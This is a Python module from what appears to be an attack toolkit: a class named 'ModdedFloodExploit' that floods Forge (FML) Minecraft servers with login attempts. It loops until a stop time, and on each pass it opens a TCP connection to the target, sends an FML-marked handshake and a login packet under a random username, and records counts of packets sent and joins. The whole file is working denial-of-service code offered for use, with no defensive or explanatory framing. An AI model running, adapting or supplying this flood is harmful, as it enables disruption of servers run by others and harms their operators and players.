import socket
import struct
import random
import string
import time
from .base import Exploit
from ..protocol_utils import pack_varint, pack_string, pack_packet

class ModdedFloodExploit(Exploit):
    """
    A login flood specifically for Forge (FML) servers. It includes the FML marker
    in the handshake, which is required for Forge servers to accept the connection.
    """
    id = "modded_flood"
    name = "Modded Flood (FML)"
    description = "Login flood optimized for Forge Modloader (FML) servers."
    category = "Modded"
    requires_forge = True

    def run(self):
        """The main worker loop for the modded login flood."""
        mod_data = self.exploit_args.get("mod_data")
        if not mod_data:
            self.log_error("Mod data not provided to exploit, aborting thread.")
            return

        while time.time() < self.stop_time:
            username = ''.join(random.choices(string.ascii_letters + string.digits, k=12))
            sock = None
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(3)
                sock.connect((self.host, self.port))

                # FML Handshake - includes the FML marker
                host_fml = f"{self.host}\0FML\0"
                handshake_data = pack_varint(-1) + pack_string(host_fml) + struct.pack(">H", self.port) + pack_varint(2)
                sock.sendall(pack_packet(0x00, handshake_data))

                # Login Start
                login_data = pack_string(username)
                sock.sendall(pack_packet(0x00, login_data))
                self.stats.increment('packets_sent', 2)

                sock.settimeout(0.5)
                sock.recv(1024)
                self.stats.increment('joins_succeeded')
            
            except (socket.timeout, ConnectionResetError):
                self.stats.increment('joins_succeeded')
            except Exception:
                self.stats.increment('joins_failed')
            finally:
                if sock:
                    sock.close()
            
            time.sleep(0.05)
